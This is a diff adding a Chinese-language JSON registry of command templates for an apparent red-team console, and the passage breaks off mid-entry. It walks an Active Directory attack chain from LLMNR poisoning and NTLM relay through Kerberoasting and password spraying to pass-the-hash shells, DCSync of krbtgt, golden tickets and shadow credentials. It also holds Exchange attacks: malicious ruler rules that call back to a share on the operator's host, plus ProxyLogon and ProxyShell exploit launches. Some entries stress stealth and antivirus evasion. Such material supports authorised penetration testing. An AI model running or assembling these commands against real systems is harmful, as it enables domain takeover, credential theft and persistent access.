@@ -1,0 +1,2482 @@
+{
+  "_meta": "动态调用口:加条目即扩展执行台。字段:id/唯一名 stage/阶段 name/显示名 desc/一句话 cmd/命令模板({{参数}}占位) params/参数表 bg/长任务(后台跑日志) timeout/秒 sudo/是否加 sudo doc/源文档 danger/红色警示 noise/动静(低|中|高)",
+  "tools": [
+    {
+      "id": "autopwn",
+      "stage": "阶段1 域外",
+      "name": "🚀 AutoPwn 一键渗透",
+      "desc": "零知识→发现→用户→凭据→BH→建议(新手模式,多源兜底)",
+      "cmd": "~/tools/bin/autopwn.sh {{net}}",
+      "params": [
+        {
+          "k": "net",
+          "l": "目标网段",
+          "req": 1,
+          "def": "10.10.10.0/24"
+        }
+      ],
+      "timeout": 1800,
+      "doc": "autopwn",
+      "noise": "高"
+    },
+    {
+      "id": "setup",
+      "stage": "阶段0 准备",
+      "name": "domain-setup 接入",
+      "desc": "对时+DNS+krb5.conf+kinit 一步接入",
+      "cmd": "~/tools/bin/domain-setup.sh {{domain}} {{dcip}} {{dcfqdn}} {{user}} {{pass}}",
+      "params": [
+        {
+          "k": "domain",
+          "l": "域名(test.local)",
+          "req": 1
+        },
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        },
+        {
+          "k": "dcfqdn",
+          "l": "域控FQDN(可空)"
+        },
+        {
+          "k": "user",
+          "l": "用户(可空)"
+        },
+        {
+          "k": "pass",
+          "l": "密码(可空)",
+          "sens": 1
+        }
+      ],
+      "sudo": 1,
+      "timeout": 60,
+      "doc": "10 阶段0",
+      "noise": "低"
+    },
+    {
+      "id": "sweep",
+      "stage": "阶段1 域外",
+      "name": "ad-sweep 一把梭",
+      "desc": "签名+relay清单(+有凭据则枚举/AS-REP/Kerberoast)",
+      "cmd": "~/tools/bin/ad-sweep.sh {{net}} {{dcip}} {{user}} {{pass}}",
+      "params": [
+        {
+          "k": "net",
+          "l": "网段CIDR",
+          "req": 1,
+          "def": "10.10.10.0/24"
+        },
+        {
+          "k": "dcip",
+          "l": "域控IP(可空)"
+        },
+        {
+          "k": "user",
+          "l": "用户(可空)"
+        },
+        {
+          "k": "pass",
+          "l": "密码(可空)",
+          "sens": 1
+        }
+      ],
+      "timeout": 300,
+      "readonly": true,
+      "doc": "10 阶段1",
+      "noise": "中"
+    },
+    {
+      "id": "fscan",
+      "stage": "阶段1 域外",
+      "name": "fscan 内网扫描",
+      "desc": "存活+端口+弱口令+漏洞一把梭",
+      "cmd": "~/tools/bin/fscan -h {{target}}",
+      "params": [
+        {
+          "k": "target",
+          "l": "目标(IP/CIDR)",
+          "req": 1,
+          "def": "10.10.10.0/24"
+        }
+      ],
+      "timeout": 600,
+      "readonly": true,
+      "doc": "05",
+      "noise": "高"
+    },
+    {
+      "id": "responder",
+      "stage": "阶段1 域外",
+      "name": "responder 抓哈希",
+      "desc": "LLMNR/NBT-NS 毒化抓 NetNTLMv2(长任务)",
+      "cmd": "responder -I {{iface}} -wv",
+      "params": [
+        {
+          "k": "iface",
+          "l": "网卡",
+          "req": 1,
+          "def": "eth0"
+        }
+      ],
+      "sudo": 1,
+      "bg": 1,
+      "doc": "10 阶段1.2",
+      "noise": "高"
+    },
+    {
+      "id": "relay-smb",
+      "stage": "阶段1 域外",
+      "name": "ntlmrelayx SMB 目标清单",
+      "desc": "对 relay-list.txt 定向中继(长任务)",
+      "cmd": "impacket-ntlmrelayx -tf \"${PROJ_DIR:-$HOME/tools}/loot/relay-list.txt\" -smb2support -socks",
+      "params": [],
+      "sudo": 1,
+      "bg": 1,
+      "doc": "10 阶段1.2",
+      "noise": "高"
+    },
+    {
+      "id": "relay-ca",
+      "stage": "阶段1 域外",
+      "name": "ntlmrelayx → CA(ESC8)",
+      "desc": "中继到 certsrv 拿机器证书(长任务,配 PetitPotam 触发)",
+      "cmd": "impacket-ntlmrelayx -t http://{{ca}}/certsrv/certfnsh.asp -smb2support --adcs",
+      "params": [
+        {
+          "k": "ca",
+          "l": "CA的FQDN",
+          "req": 1
+        }
+      ],
+      "sudo": 1,
+      "bg": 1,
+      "doc": "11 ESC8",
+      "noise": "高"
+    },
+    {
+      "id": "petitpotam",
+      "stage": "阶段1 域外",
+      "name": "PetitPotam 触发认证",
+      "desc": "逼目标向本机发起认证(喂给 relay)",
+      "cmd": "_U={{user}}; if [ -n \"$_U\" ]; then _A=\"{{domain}}/$_U:{{pass}}@{{target}}\"; else _A=\"{{target}}\"; fi; python3 ~/tools/src/PetitPotam/petitpotam.py -dc-ip {{dcip}} \"$_A\" '\\\\{{me}}\\\\share'",
+      "params": [
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        },
+        {
+          "k": "domain",
+          "l": "域名(留空=匿名)"
+        },
+        {
+          "k": "user",
+          "l": "用户(留空=匿名)"
+        },
+        {
+          "k": "pass",
+          "l": "密码(留空=匿名)",
+          "sens": 1
+        },
+        {
+          "k": "target",
+          "l": "目标机器IP",
+          "req": 1
+        },
+        {
+          "k": "me",
+          "l": "本机IP",
+          "req": 1
+        }
+      ],
+      "sudo": 1,
+      "timeout": 120,
+      "doc": "11 ESC8",
+      "noise": "高"
+    },
+    {
+      "id": "spray",
+      "stage": "阶段1 域外",
+      "name": "spray-safe 安全喷洒",
+      "desc": "读锁定策略自动节流,防锁号",
+      "cmd": "~/tools/bin/spray-safe.sh {{dcip}} {{userlist}} {{user}} {{pass}} {{spraypw}}",
+      "params": [
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        },
+        {
+          "k": "userlist",
+          "l": "用户字典路径",
+          "req": 1,
+          "def": "/tmp/users.txt"
+        },
+        {
+          "k": "user",
+          "l": "验证用户"
+        },
+        {
+          "k": "pass",
+          "l": "验证密码",
+          "sens": 1
+        },
+        {
+          "k": "spraypw",
+          "l": "喷洒密码(空则读passwords.txt)"
+        }
+      ],
+      "timeout": 3600,
+      "doc": "10 阶段1.4",
+      "noise": "高"
+    },
+    {
+      "id": "null-enum",
+      "stage": "阶段1 域外",
+      "name": "空会话用户枚举",
+      "desc": "Null Auth 允许时 rid-brute 列真实本地/域用户(LOGON_FAILURE 后第一刀)",
+      "cmd": "nxc smb {{target}} -u '' -p '' --rid-brute",
+      "params": [
+        {
+          "k": "target",
+          "l": "目标IP",
+          "req": 1
+        }
+      ],
+      "timeout": 300,
+      "readonly": true,
+      "doc": "TRICKS 工作组",
+      "noise": "中"
+    },
+    {
+      "id": "hash-check",
+      "stage": "阶段3 横向",
+      "name": "哈希预检",
+      "desc": "本地 potfile 秒查+常见弱哈希比对(喷洒前先看值不值)",
+      "cmd": "echo {{hash}} > /tmp/hc.txt; hashcat -m 1000 /tmp/hc.txt --show; hashcat -m 1000 /tmp/hc.txt /usr/share/wordlists/rockyou.txt -O --potfile-path /tmp/pot.pot 2>/dev/null | tail -2; rm -f /tmp/hc.txt",
+      "params": [
+        {
+          "k": "hash",
+          "l": "NT哈希",
+          "req": 1,
+          "sens": 1
+        }
+      ],
+      "timeout": 600,
+      "readonly": true,
+      "doc": "04",
+      "noise": "低"
+    },
+    {
+      "id": "wg-hash-spray",
+      "stage": "阶段3 横向",
+      "name": "工作组哈希碰撞",
+      "desc": "单哈希全网段 --local-auth 喷洒(找本地管理员密码复用)",
+      "cmd": "nxc smb {{net}} -u {{user}} -H {{nthash}} --local-auth --continue-on-success",
+      "params": [
+        {
+          "k": "net",
+          "l": "网段CIDR",
+          "req": 1,
+          "def": "192.168.1.0/24"
+        },
+        {
+          "k": "user",
+          "l": "本地账户(administrator/admin…)",
+          "req": 1,
+          "def": "administrator"
+        },
+        {
+          "k": "nthash",
+          "l": "NT哈希",
+          "req": 1,
+          "sens": 1
+        }
+      ],
+      "timeout": 600,
+      "doc": "TRICKS 工作组",
+      "noise": "高"
+    },
+    {
+      "id": "nxc-verify",
+      "stage": "阶段2 立足",
+      "name": "nxc 凭据验证",
+      "desc": "账密/哈希验证+签名状态",
+      "cmd": "nxc smb {{target}} -u {{user}} {{auth}}",
+      "params": [
+        {
+          "k": "target",
+          "l": "目标(IP/CIDR)",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "用户",
+          "req": 1
+        },
+        {
+          "k": "auth",
+          "l": "-p '密码' 或 -H 哈希 --local-auth",
+          "req": 1,
+          "def": "-p 'Passw0rd!'"
+        }
+      ],
+      "timeout": 120,
+      "doc": "10 阶段2.1",
+      "noise": "中"
+    },
+    {
+      "id": "bh-collect",
+      "stage": "阶段2 立足",
+      "name": "BloodHound 采集",
+      "desc": "Linux 侧全量采集(产出 zip 拖进 8080 导入)",
+      "cmd": "bloodhound-python -u {{user}} -p {{pass}} -d {{domain}} -dc {{dcfqdn}} -ns {{dcip}} -c All --zip",
+      "params": [
+        {
+          "k": "user",
+          "l": "用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "dcfqdn",
+          "l": "域控FQDN",
+          "req": 1
+        },
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        }
+      ],
+      "timeout": 600,
+      "readonly": true,
+      "doc": "10 阶段2.2",
+      "noise": "中"
+    },
+    {
+      "id": "asreproast",
+      "stage": "阶段2 立足",
+      "name": "AS-REP Roast",
+      "desc": "无预认证账户哈希抓取",
+      "cmd": "impacket-GetNPUsers {{domain}}/ -usersfile {{userlist}} -no-pass -format hashcat -dc-ip {{dcip}}",
+      "params": [
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "userlist",
+          "l": "用户字典",
+          "req": 1,
+          "def": "/tmp/users.txt"
+        },
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        }
+      ],
+      "timeout": 300,
+      "readonly": true,
+      "doc": "12 §2",
+      "noise": "中"
+    },
+    {
+      "id": "kerberoast",
+      "stage": "阶段2 立足",
+      "name": "Kerberoast",
+      "desc": "SPN 服务账户 TGS 抓取",
+      "cmd": "impacket-GetUserSPNs {{domain}}/{{user}}:{{pass}} -dc-ip {{dcip}} -request -outputfile /tmp/tgs.txt",
+      "params": [
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        }
+      ],
+      "timeout": 300,
+      "readonly": true,
+      "doc": "12 §3",
+      "noise": "中"
+    },
+    {
+      "id": "gmsa",
+      "stage": "阶段2 立足",
+      "name": "gMSA 密码读取",
+      "desc": "有读取权限时直接吐 gMSA 密码",
+      "cmd": "python3 ~/tools/src/gMSADumper/gMSADumper.py -u {{user}} -p {{pass}} -d {{domain}} -l {{dcip}}",
+      "params": [
+        {
+          "k": "user",
+          "l": "用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        }
+      ],
+      "timeout": 120,
+      "readonly": true,
+      "doc": "12 §7",
+      "noise": "中"
+    },
+    {
+      "id": "hashcat18200",
+      "stage": "阶段2 立足",
+      "name": "hashcat 破 AS-REP",
+      "desc": "rockyou 跑 18200",
+      "cmd": "hashcat -m 18200 {{hashfile}} /usr/share/wordlists/rockyou.txt -O --force",
+      "params": [
+        {
+          "k": "hashfile",
+          "l": "哈希文件",
+          "req": 1,
+          "def": "/tmp/asrep.txt"
+        }
+      ],
+      "timeout": 1800,
+      "readonly": true,
+      "doc": "12 §2",
+      "noise": "低"
+    },
+    {
+      "id": "hashcat13100",
+      "stage": "阶段2 立足",
+      "name": "hashcat 破 Kerberoast",
+      "desc": "rockyou 跑 13100",
+      "cmd": "hashcat -m 13100 {{hashfile}} /usr/share/wordlists/rockyou.txt -O --force",
+      "params": [
+        {
+          "k": "hashfile",
+          "l": "哈希文件",
+          "req": 1,
+          "def": "/tmp/tgs.txt"
+        }
+      ],
+      "timeout": 1800,
+      "readonly": true,
+      "doc": "12 §3",
+      "noise": "低"
+    },
+    {
+      "id": "crack-sync",
+      "stage": "阶段2 立足",
+      "name": "哈希爆破同步",
+      "desc": "hashcat --show 回收破解队列:已破凭据回写 creds/state,已破哈希出队",
+      "cmd": "~/tools/bin/crack-sync.sh",
+      "params": [],
+      "readonly": true,
+      "timeout": 120,
+      "doc": "04",
+      "noise": "低"
+    },
+    {
+      "id": "secretsdump",
+      "stage": "阶段3 横向",
+      "name": "secretsdump 倾泻",
+      "desc": "远程 dump 本地/全域凭据(-just-dc 打 DC)",
+      "cmd": "impacket-secretsdump '{{domain}}/{{user}}:{{pass}}@{{target}}'",
+      "params": [
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码(可换 哈希@ 拼法)",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "target",
+          "l": "目标IP",
+          "req": 1
+        }
+      ],
+      "danger": 1,
+      "timeout": 600,
+      "doc": "10 阶段3/4.3",
+      "noise": "高"
+    },
+    {
+      "id": "psexec",
+      "stage": "阶段3 横向",
+      "name": "psexec/wmiexec 半交互",
+      "desc": "PTH 拿 shell(交互式,建议终端跑;此处验证连通)",
+      "cmd": "impacket-wmiexec '{{domain}}/{{user}}@{{target}}' -hashes :{{nthash}}",
+      "params": [
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "管理员用户",
+          "req": 1
+        },
+        {
+          "k": "nthash",
+          "l": "NT哈希",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "target",
+          "l": "目标IP",
+          "req": 1
+        }
+      ],
+      "danger": 1,
+      "timeout": 120,
+      "doc": "10 阶段3",
+      "noise": "高"
+    },
+    {
+      "id": "evilwinrm",
+      "stage": "阶段3 横向",
+      "name": "evil-winrm 验证",
+      "desc": "WinRM 连通性(交互式 shell 建议终端)",
+      "cmd": "evil-winrm -i {{target}} -u {{user}} -H {{nthash}} --spin-http-timeout 5 || evil-winrm -i {{target}} -u {{user}} -H {{nthash}}",
+      "params": [
+        {
+          "k": "target",
+          "l": "目标IP",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "用户",
+          "req": 1
+        },
+        {
+          "k": "nthash",
+          "l": "NT哈希",
+          "req": 1,
+          "sens": 1
+        }
+      ],
+      "danger": 1,
+      "timeout": 120,
+      "doc": "10 阶段3",
+      "noise": "中"
+    },
+    {
+      "id": "certipy-find",
+      "stage": "阶段4 域控",
+      "name": "certipy ADCS 摸底",
+      "desc": "枚举 CA+易受攻击模板(ESC 全集)",
+      "cmd": "certipy find -u {{user}}@{{domain}} -p {{pass}} -dc-ip {{dcip}} -vulnerable -stdout",
+      "params": [
+        {
+          "k": "user",
+          "l": "用户",
+          "req": 1
+        },
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        }
+      ],
+      "timeout": 300,
+      "readonly": true,
+      "doc": "11",
+      "noise": "中"
+    },
+    {
+      "id": "certipy-req",
+      "stage": "阶段4 域控",
+      "name": "certipy 申请证书",
+      "desc": "ESC1 类:指定模板申请(可加 -upn 伪装)",
+      "cmd": "certipy req -u {{user}}@{{domain}} -p {{pass}} -ca {{ca}} -template {{template}} -dc-ip {{dcip}}",
+      "params": [
+        {
+          "k": "user",
+          "l": "用户",
+          "req": 1
+        },
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "ca",
+          "l": "CA名",
+          "req": 1
+        },
+        {
+          "k": "template",
+          "l": "模板名",
+          "req": 1,
+          "def": "User"
+        },
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        }
+      ],
+      "danger": 1,
+      "timeout": 300,
+      "doc": "11 ESC1",
+      "noise": "中"
+    },
+    {
+      "id": "certipy-auth",
+      "stage": "阶段4 域控",
+      "name": "certipy 证书→哈希/票",
+      "desc": "PFX 换 NT 哈希+TGT",
+      "cmd": "certipy auth -pfx {{pfx}} -dc-ip {{dcip}}",
+      "params": [
+        {
+          "k": "pfx",
+          "l": "PFX路径",
+          "req": 1
+        },
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        }
+      ],
+      "timeout": 300,
+      "doc": "11",
+      "noise": "中"
+    },
+    {
+      "id": "rbcd-write",
+      "stage": "阶段4 域控",
+      "name": "RBCD 第1步:写委托",
+      "desc": "impacket-rbcd 写 msDS-AllowedToActOnBehalf",
+      "cmd": "impacket-rbcd '{{domain}}/{{user}}:{{pass}}' -dc-ip {{dcip}} -action write -delegate-to '{{victim}}$' -delegate-from '{{control}}$'",
+      "params": [
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "有写权限的用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        },
+        {
+          "k": "victim",
+          "l": "目标机器名(不带$)",
+          "req": 1
+        },
+        {
+          "k": "control",
+          "l": "我控机器名(不带$)",
+          "req": 1
+        }
+      ],
+      "danger": 1,
+      "timeout": 120,
+      "doc": "12 §6",
+      "noise": "中"
+    },
+    {
+      "id": "rbcd-getst",
+      "stage": "阶段4 域控",
+      "name": "RBCD 第2步:S4U 取票",
+      "desc": "getST 伪冒 administrator",
+      "cmd": "impacket-getST '{{domain}}/{{control}}$:{{mypass}}' -spn host/{{victim}}.{{domain}} -impersonate administrator -dc-ip {{dcip}}",
+      "params": [
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "control",
+          "l": "我控机器名(不带$)",
+          "req": 1
+        },
+        {
+          "k": "mypass",
+          "l": "我控机器账户密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "victim",
+          "l": "目标机器名(不带$)",
+          "req": 1
+        },
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        }
+      ],
+      "danger": 1,
+      "timeout": 120,
+      "doc": "12 §6",
+      "noise": "中"
+    },
+    {
+      "id": "dcsync",
+      "stage": "阶段4 域控",
+      "name": "DCSync(krbtgt)",
+      "desc": "DRSUAPI 远程复制 krbtgt(零落地,不过杀软);父域 EA 可直接拉子域(targetdom=NORTH,凭据用父域)",
+      "cmd": "NB=$([ -n '{{targetdom}}' ] && echo {{targetdom}} || echo {{domain}} | cut -d. -f1 | tr 'a-z' 'A-Z'); if [ -n '{{nthash}}' ]; then impacket-secretsdump -hashes :{{nthash}} '{{domain}}/{{user}}@{{dc}}' -just-dc-user \"$NB/krbtgt\"; else impacket-secretsdump '{{domain}}/{{user}}:{{pass}}@{{dc}}' -just-dc-user \"$NB/krbtgt\"; fi",
+      "params": [
+        {
+          "k": "domain",
+          "l": "凭据所属域",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "用户(EA/DA)",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码(nthash 优先)",
+          "sens": 1
+        },
+        {
+          "k": "dc",
+          "l": "目标域控FQDN",
+          "req": 1
+        },
+        {
+          "k": "nthash",
+          "l": "NT哈希(可空,PtH)"
+        },
+        {
+          "k": "targetdom",
+          "l": "目标域NetBIOS(跨域EA时填,如 NORTH)"
+        }
+      ],
+      "danger": 1,
+      "timeout": 600,
+      "doc": "10 阶段4.3",
+      "noise": "高"
+    },
+    {
+      "id": "raise-child",
+      "stage": "阶段4 域控",
+      "name": "raiseChild 子域提权",
+      "desc": "子域 DA→父域/林 一键提升(impacket 经典)",
+      "cmd": "impacket-raiseChild '{{domain}}/{{user}}:{{pass}}' -dc-ip {{dcip}} -w raisechild.ccache",
+      "params": [
+        {
+          "k": "domain",
+          "l": "子域名",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "子域 DA",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "dcip",
+          "l": "子域域控IP",
+          "req": 1
+        }
+      ],
+      "danger": 1,
+      "timeout": 300,
+      "doc": "22 §3",
+      "noise": "高"
+    },
+    {
+      "id": "golden-extrasid",
+      "stage": "阶段4 域控",
+      "name": "跨域金票(extraSid)",
+      "desc": "子域 SID 票 + 附加父域 EA 组 SID 跨域通行",
+      "cmd": "impacket-ticketer -domain {{domain}} -domain-sid {{childsid}} -extra-sid {{parentsid}}-519 -nthash {{nthash}} -dc-ip {{dcip}} administrator",
+      "params": [
+        {
+          "k": "domain",
+          "l": "子域名",
+          "req": 1
+        },
+        {
+          "k": "childsid",
+          "l": "子域SID",
+          "req": 1
+        },
+        {
+          "k": "parentsid",
+          "l": "父域SID(去尾519)",
+          "req": 1
+        },
+        {
+          "k": "nthash",
+          "l": "子域krbtgt NT",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "dcip",
+          "l": "子域DC IP",
+          "req": 1
+        }
+      ],
+      "danger": 1,
+      "timeout": 120,
+      "doc": "22 §4",
+      "noise": "低"
+    },
+    {
+      "id": "golden",
+      "stage": "阶段5 维持",
+      "name": "金票生成",
+      "desc": "ticketer 伪造 administrator 票据",
+      "cmd": "impacket-ticketer -domain {{domain}} -domain-sid {{sid}} -nthash {{krbtgt}} -dc-ip {{dcip}} -user-id 500 administrator",
+      "params": [
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "sid",
+          "l": "域SID(S-1-5-21…)",
+          "req": 1
+        },
+        {
+          "k": "krbtgt",
+          "l": "krbtgt NT哈希",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        }
+      ],
+      "danger": 1,
+      "timeout": 120,
+      "doc": "10 阶段5",
+      "noise": "低"
+    },
+    {
+      "id": "sid-lookup",
+      "stage": "阶段5 维持",
+      "name": "域SID 获取",
+      "desc": "lookupsid 拿域 SID(金票前置)",
+      "cmd": "impacket-lookupsid '{{domain}}/{{user}}:{{pass}}@{{dcip}}' 0 | grep -oE 'S-1-5-21-[0-9-]+' | head -1",
+      "params": [
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        }
+      ],
+      "timeout": 120,
+      "readonly": true,
+      "doc": "10 阶段5",
+      "noise": "中"
+    },
+    {
+      "id": "shadow-add",
+      "stage": "阶段5 维持",
+      "name": "影子凭据(pywhisker)",
+      "desc": "给目标挂 keycredential,长期取票",
+      "cmd": "python3 ~/tools/src/pywhisker/pywhisker/pywhisker.py -d {{domain}} -u {{user}} -p {{pass}} --target {{targetuser}} --action add",
+      "params": [
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "有写权限用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "targetuser",
+          "l": "目标用户",
+          "req": 1
+        }
+      ],
+      "danger": 1,
+      "timeout": 120,
+      "doc": "10 阶段5",
+      "noise": "中"
+    },
+    {
+      "id": "ex-discover",
+      "stage": "Exchange/ADFS",
+      "name": "Exchange 面探测",
+      "desc": "OWA/ECP/EWS/Autodiscover/MAPI 路径+版本头一把梭",
+      "cmd": "for p in owa ecp ews autodiscover mapi api; do echo \"== /$p\"; curl -sk -o /dev/null -w '%{http_code} ' https://{{target}}/$p; curl -skI --max-time 8 https://{{target}}/$p | grep -iE 'x-owa-version|x-powered-by|server:' ; done; echo; nmap --script http-enum -p 443 {{target}} 2>/dev/null | grep -iE 'owa|exchange|ecp|ews' | head -8",
+      "params": [
+        {
+          "k": "target",
+          "l": "Exchange主机(FQDN/IP)",
+          "req": 1
+        }
+      ],
+      "timeout": 180,
+      "readonly": true,
+      "doc": "15 Exchange篇1",
+      "noise": "中"
+    },
+    {
+      "id": "owa-spray-msf",
+      "stage": "Exchange/ADFS",
+      "name": "OWA 密码喷洒(msf)",
+      "desc": "msf owa_login 模块,自动判成功",
+      "cmd": "msfconsole -q -x 'use auxiliary/scanner/http/owa_login; set RHOSTS {{target}}; set USER_FILE {{userlist}}; set PASSWORD {{pass}}; set VERBOSE false; run; exit'",
+      "params": [
+        {
+          "k": "target",
+          "l": "Exchange主机",
+          "req": 1
+        },
+        {
+          "k": "userlist",
+          "l": "用户名字典",
+          "req": 1,
+          "def": "/tmp/users.txt"
+        },
+        {
+          "k": "pass",
+          "l": "喷洒密码",
+          "req": 1,
+          "sens": 1
+        }
+      ],
+      "timeout": 600,
+      "doc": "15 Exchange篇2",
+      "noise": "高"
+    },
+    {
+      "id": "ruler-check",
+      "stage": "Exchange/ADFS",
+      "name": "ruler MAPI 探测",
+      "desc": "凭据验证+MAPI 可达性(后续 add 写规则)",
+      "cmd": "~/tools/bin/ruler --url https://{{target}} --user {{user}} --pass {{pass}} --verbose check",
+      "params": [
+        {
+          "k": "target",
+          "l": "Exchange主机",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "用户(域\\\\用户)",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        }
+      ],
+      "timeout": 180,
+      "doc": "15 Exchange篇3",
+      "noise": "中"
+    },
+    {
+      "id": "ruler-add",
+      "stage": "Exchange/ADFS",
+      "name": "ruler 写恶意规则",
+      "desc": "MAPI 规则触发执行(发件即触发)",
+      "cmd": "~/tools/bin/ruler --url https://{{target}} --user {{user}} --pass {{pass}} add --location '\\\\{{me}}\\share\\cmd.exe' --trigger {{trigger}} --send",
+      "params": [
+        {
+          "k": "target",
+          "l": "Exchange主机",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "me",
+          "l": "回连共享主机(本机IP)",
+          "req": 1
+        },
+        {
+          "k": "trigger",
+          "l": "触发词(如 password123)",
+          "req": 1,
+          "def": "password123"
+        }
+      ],
+      "danger": 1,
+      "timeout": 300,
+      "doc": "15 Exchange篇3",
+      "noise": "高"
+    },
+    {
+      "id": "proxylogon-msf",
+      "stage": "Exchange/ADFS",
+      "name": "ProxyLogon(CVE-2021-26855)",
+      "desc": "msf 一键,Exchange 2013/2016/2019 未打补丁",
+      "cmd": "msfconsole -q -x 'use exploit/windows/http/exchange_proxylogon_rce; set RHOSTS {{target}}; set EMAIL {{email}}; set LHOST {{me}}; run -j; exit'",
+      "params": [
+        {
+          "k": "target",
+          "l": "Exchange主机",
+          "req": 1
+        },
+        {
+          "k": "email",
+          "l": "已知邮箱(管理员)",
+          "req": 1
+        },
+        {
+          "k": "me",
+          "l": "本机回连IP",
+          "req": 1
+        }
+      ],
+      "danger": 1,
+      "timeout": 900,
+      "doc": "15 Exchange篇4",
+      "noise": "高"
+    },
+    {
+      "id": "proxyshell-msf",
+      "stage": "Exchange/ADFS",
+      "name": "ProxyShell(CVE-2021-34473链)",
+      "desc": "msf 一键,Exchange 2013/2016/2019 未打补丁",
+      "cmd": "msfconsole -q -x 'use exploit/windows/http/exchange_proxyshell_rce; set RHOSTS {{target}}; set EMAIL {{email}}; set LHOST {{me}}; run -j; exit'",
+      "params": [
+        {
+          "k": "target",
+          "l": "Exchange主机",
+          "req": 1
+        },
+        {
+          "k": "email",
+          "l": "已知邮箱",
+          "req": 1
+        },
+        {
+          "k": "me",
+          "l": "本机回连IP",
+          "req": 1
+        }
+      ],
+      "danger": 1,
+      "timeout": 900,
+      "doc": "15 Exchange篇4",
+      "noise": "高"
+    },
+    {
+      "id": "adfs-dcsync",
+      "stage": "Exchange/ADFS",
+      "name": "ADFS 服务账户 DCSync",
+      "desc": "取 ADFS svc 哈希(黄金 ADFS 第一步)",
+      "cmd": "impacket-secretsdump '{{domain}}/{{user}}:{{pass}}@{{dc}}' -just-dc-user {{adfsuser}}",
+      "params": [
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "DA用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "dc",
+          "l": "域控FQDN",
+          "req": 1
+        },
+        {
+          "k": "adfsuser",
+          "l": "ADFS服务账户名",
+          "req": 1,
+          "def": "adfs_svc"
+        }
+      ],
+      "danger": 1,
+      "timeout": 600,
+      "doc": "15 ADFS篇2",
+      "noise": "高"
+    },
+    {
+      "id": "bh-fixqueries",
+      "stage": "Exchange/ADFS",
+      "name": "BH 查询集固化",
+      "desc": "19 条红队查询导入 BloodHound CE(含 Exchange/ADFS 猎杀)",
+      "cmd": "python3 ~/tools/bin/bh-queries.py",
+      "params": [],
+      "timeout": 120,
+      "readonly": true,
+      "doc": "15 联动",
+      "noise": "低"
+    },
+    {
+      "id": "krbrelay",
+      "stage": "新打法",
+      "name": "krbrelayx Kerberos 中继",
